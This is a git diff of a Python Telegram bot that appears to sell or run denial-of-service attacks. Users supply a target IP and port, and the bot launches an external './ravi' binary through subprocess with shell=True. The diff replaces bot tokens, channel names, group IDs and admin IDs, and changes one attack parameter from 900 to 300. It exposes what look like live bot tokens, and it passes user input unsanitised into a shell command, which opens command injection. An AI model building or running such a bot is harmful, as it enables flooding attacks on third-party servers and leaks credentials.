@@ -7,19 +7,19 @@ import threading
 from telebot import types
 
 # TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('8111473127:AAHzMZLUdOpm1DVS4DFq_2-cYFieNa7z7MA')
+bot = telebot.TeleBot('8028571288:AAEBfwwTIL2vOaQA1Y9JXJ1mg_FNhNmjdrc')
 
 # GROUP AND CHANNEL DETAILS
-GROUP_ID = "-1002369239894"
-CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
-SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
-ADMINS = [7129010361]
+GROUP_ID = "-1002546621996"
+CHANNEL_USERNAME = "@adarsh7bgmi"
+SCREENSHOT_CHANNEL = "@@adarsh7bgmi"
+ADMINS = [6460304861]
 
 # GLOBAL VARIABLES
 is_attack_running = False
 attack_end_time = None
 pending_feedback = {}
-wif user_id not inarn_count = {}
+warn_count = {}
 attack_logs = []
 user_attack_count = {}
 used_targets = {} 
@@ -102,7 +102,7 @@ def handle_attack(message):
 
     # Attack Execution
     try:
-        subprocess.run(f"./ravi {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./ravi {target} {port} {time_duration} 300", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘𝗢𝗨𝗧 𝗛𝗢 𝗚𝗔𝗬𝗔! 🚨")
     except subprocess.CalledProcessError:
